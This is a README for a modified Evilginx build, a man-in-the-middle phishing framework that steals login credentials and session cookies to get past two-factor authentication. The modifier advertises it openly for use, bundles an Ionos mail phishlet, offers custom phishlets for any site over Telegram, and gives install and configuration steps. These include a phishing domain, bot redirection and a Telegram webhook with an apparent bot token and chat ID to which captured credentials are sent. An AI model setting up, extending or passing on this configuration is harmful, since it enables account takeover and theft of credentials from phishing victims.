<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

# Evilginx 3.4.0 - Modified by @HosterMSG








# NEW VERSION AVAILABLE
https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification
# NEW VERSION





# NEW VERSION AVAILABLE
https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification
# NEW VERSION













This modified version can send logs to your telegram group chat.
Inside this modified version i have added free Ionos mail phishlet as proof of high quality product i have nothing to hide.
Incase u want more phishlets let me know we can do any website u want without any upfront payments.
https://t.me/HosterMSG

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.


This version Google / Gsuite Cookie Interception Template/Phishlet In Action.
https://vimeo.com/931409763

Alternative video url:
https://www.flexclip.com/editor/app?id=9e89b4e3509603d00d53064b8058bcd1


How to install ?

On Ubuntu:

1. git clone https://github.com/EvilHoster/evilginx-3.4.0-telegram-modification
2. cd evilginx-3.4.0-telegram-modification
3. cd build
4. chmod +rwx evilginx
5. ./evilginx -p ../phishlets/

Setup your configuration.

1. config domain something.com
2. cofig ipv4 external serverip
3. config ipv4 bind serverip
4. config unauth_url https://bots.here.redirected.com/
5. config autocert off/on

[ if ON free certificates is used, it can rate-limit your domain if u ask too much. ]
[ If OFF 
- Feature: Added support to load custom TLS certificates from a public certificate file and a private key file stored in `~/.evilginx/crt/sites/<hostname>/`. Will load `fullchain.pem` and `privkey.pem` pair or a combination of a `.pem`/`.crt` (public certificate) and a `.key` (private key) file. Make sure to run without `-developer` flag and disable autocert retrieval with `config autocert off`.
}


6.config webhook_telegram 7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y/-15604540645

7192062302:AAGvU9P57FF37gz-ZRUuonESXwvStiQV58Y is a Token from Bot Father.
-15604540645 is a Chat ID inside your group.

Add to your Telegram group https://t.me/raw_data_bot and your Group Chat ID will be displayed.







## Help

In case you want to learn how to install and use **Evilginx**, please refer to online documentation available at:

https://help.evilginx.com


This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, but i did modification in 2024.04.02 which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
